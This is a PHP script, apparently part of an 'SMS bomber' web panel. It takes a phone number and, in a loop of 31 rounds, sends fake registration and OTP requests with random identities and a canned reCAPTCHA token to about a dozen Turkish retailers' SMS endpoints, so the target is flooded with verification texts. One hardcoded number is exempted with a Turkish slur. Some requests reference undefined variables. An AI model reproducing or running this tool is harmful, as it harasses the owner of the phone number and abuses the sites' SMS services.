<?php

header("Content-Type: application/json; utf-8;");

include "../../server/authcontrol.php";

ini_set("display_errors", 0);
error_reporting(0);

function generateRandomString($length = 15) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$numara = $_POST['numara'];

if($numara == "5526359477")
{
    echo json_encode(array(
        'status' => 'oc',
        'message' => 'Numara yasak lan orospu evladı xD'
    ));
    exit;
}
for($deger = 0; $deger <=30; $deger++)
{
$mailaa = generateRandomString();
$sifre = "!1Ad".generateRandomString()."";
$mail = "$mailaa@gmail.com";

$url="https://www.a101.com.tr/users/otp-login/"; 
$postinfo3 = "first_name=$mailaa&last_name=$mailaa&email=$mail&phone=0$numara&password=$mailaa&email_allowed=true&sms_allowed=true&confirm=true&kvkk=true&next=%2F&g-recaptcha-response=03AEkXODAo7uDjjPkwucbje4tzLwl_DS3CnIXso6CqYnRsQmFInJTenHAkVivpGoFN482Xoz1GCsn_35IZVDSdgjZGOOzDh_t6PW73fne5nQyWdvl1PDnlGkKV9Ny-QWj08vykuRED_Ep5AJiXukrCNzYDYPvxjmzTb5IuATrR0974Gp-woTYec0V6DpDeXkewajAqZUzYUYawW9eLL0szqVxjXGVRAbqDSQTrpttImUhWM4Q8ct1PKP1hsUTd2QnuDIyurhBKzBJGt5nx6vGpOL-KlfVdPFxgeNRHrkSe_Le1n-hSspAclXkU_XVYnNMxqVp1OASeSSQ-GXOy3YqPXtFiGASuTvLuI8gZlhc0PdZIcqEYHaegvxgMjazJq8uVHW7t3cK3N3YP_eMIpRiu0NeQcBp2ErMBbuwJ_ftREYabkFrYel0QyR8p57TrH0-xI7vPe7WcokLFb3ou1F9cpi078iJOHsmQBErfGN733l-VjwvrL4iRQFzrs1-VWLTuQ1LN4jybexUZ";

//init curl instance
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_URL, $url3);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postinfo3);
curl_exec($ch);
curl_close($ch);

$url2="https://www.otokocikinciel.com/Ajax/SendOtp"; 
$postinfo3 = "first_name=$mailaa&last_name=$mailaa&email=$mail&phone=0$numara&password=$mailaa&email_allowed=true&sms_allowed=true&confirm=true&kvkk=true&next=%2F&g-recaptcha-response=03AEkXODAo7uDjjPkwucbje4tzLwl_DS3CnIXso6CqYnRsQmFInJTenHAkVivpGoFN482Xoz1GCsn_35IZVDSdgjZGOOzDh_t6PW73fne5nQyWdvl1PDnlGkKV9Ny-QWj08vykuRED_Ep5AJiXukrCNzYDYPvxjmzTb5IuATrR0974Gp-woTYec0V6DpDeXkewajAqZUzYUYawW9eLL0szqVxjXGVRAbqDSQTrpttImUhWM4Q8ct1PKP1hsUTd2QnuDIyurhBKzBJGt5nx6vGpOL-KlfVdPFxgeNRHrkSe_Le1n-hSspAclXkU_XVYnNMxqVp1OASeSSQ-GXOy3YqPXtFiGASuTvLuI8gZlhc0PdZIcqEYHaegvxgMjazJq8uVHW7t3cK3N3YP_eMIpRiu0NeQcBp2ErMBbuwJ_ftREYabkFrYel0QyR8p57TrH0-xI7vPe7WcokLFb3ou1F9cpi078iJOHsmQBErfGN733l-VjwvrL4iRQFzrs1-VWLTuQ1LN4jybexUZ";

//init curl instance
$ch = curl_init();

//init curl instance
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postinfo2);
curl_exec($ch);
curl_close($ch);

$url3="https://www.kigili.com/users/registration/"; 
$postinfo3 = "first_name=$mailaa&last_name=$mailaa&email=$mail&phone=0$numara&password=$mailaa&email_allowed=true&sms_allowed=true&confirm=true&kvkk=true&next=%2F&g-recaptcha-response=03AEkXODAo7uDjjPkwucbje4tzLwl_DS3CnIXso6CqYnRsQmFInJTenHAkVivpGoFN482Xoz1GCsn_35IZVDSdgjZGOOzDh_t6PW73fne5nQyWdvl1PDnlGkKV9Ny-QWj08vykuRED_Ep5AJiXukrCNzYDYPvxjmzTb5IuATrR0974Gp-woTYec0V6DpDeXkewajAqZUzYUYawW9eLL0szqVxjXGVRAbqDSQTrpttImUhWM4Q8ct1PKP1hsUTd2QnuDIyurhBKzBJGt5nx6vGpOL-KlfVdPFxgeNRHrkSe_Le1n-hSspAclXkU_XVYnNMxqVp1OASeSSQ-GXOy3YqPXtFiGASuTvLuI8gZlhc0PdZIcqEYHaegvxgMjazJq8uVHW7t3cK3N3YP_eMIpRiu0NeQcBp2ErMBbuwJ_ftREYabkFrYel0QyR8p57TrH0-xI7vPe7WcokLFb3ou1F9cpi078iJOHsmQBErfGN733l-VjwvrL4iRQFzrs1-VWLTuQ1LN4jybexUZ";

//init curl instance
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_URL, $url3);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postinfo3);
curl_exec($ch);
curl_close($ch);

$url4="https://www.defacto.com.tr/Login/SendGiftClubCustomerConfirmationSms"; 
$postinfo4 = "mobilePhone=0$numara&page=Login";

//init curl instance
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_URL, $url4);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postinfo4);
curl_exec($ch);
curl_close($ch);

$url5="https://www.eastpak.com.tr/Uye/CheckPhoneAndSendSms?phone=$numara"; 

//init curl instance
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_NOBODY, true);
curl_setopt($ch, CURLOPT_URL, $url5);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_exec($ch);
curl_close($ch);

$url6="https://onlineislemler.petrolofisi.com.tr/Authentication/Register"; 
$postinfo6 = "name=Alper&surname=Kaya&phone=0$numara&referenceCode=&cardNo=&plate=34UHJ614&contractPermission=true&contactPermission=true&kvkkPermission=true";

//init curl instance
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_URL, $url6);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postinfo6);
curl_exec($ch);
curl_close($ch);

$url8="https://www.podyumplus.com/index.php?route=account/account/control&telephone=$numara"; 

//init curl instance
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_URL, $url8);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_exec($ch);
curl_close($ch);

$url9="https://www.apaydinsupermarket.com/uye/uyeolMobile"; 
$postinfo9 = "cepTel=$numara";

//init curl instance
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_URL, $url9);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postinfo9);
curl_exec($ch);
curl_close($ch);

$url10="https://mopas.com.tr/sms/activation?mobileNumber=$numara&pwd=&checkPwd="; 

//init curl instance
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_URL, $url10);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_exec($ch);
curl_close($ch);

$url11="https://hummel.com.tr/Uye/CheckPhoneAndSendSms?phone=$numara"; 

//init curl instance
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_URL, $url11);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_exec($ch);
curl_close($ch);

$url12="https://www.mngkargo.com.tr/Account/GetSmsActivationCode"; 
$postinfo12 = "phoneNumber=$numara";

//init curl instance
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_URL, $url12);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postinfo12);
curl_exec($ch);
curl_close($ch);
}
?>